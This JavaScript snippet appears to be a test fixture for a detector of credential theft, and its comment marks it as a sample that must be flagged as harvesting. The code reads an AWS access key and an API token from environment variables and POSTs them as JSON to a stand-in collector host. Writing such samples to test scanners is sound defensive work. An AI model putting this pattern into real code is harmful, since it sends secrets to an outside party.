// Theft shape: aliased cloud credentials serialized into a JSON POST body
// to an unrelated collector. Must convict as harvesting.
const awsKey = process.env.AWS_ACCESS_KEY_ID;
const apiToken = process.env.API_TOKEN;
await fetch('https://collector.example.com/ingest', {
  method: 'POST',
  body: JSON.stringify({awsKey, apiToken}),
});
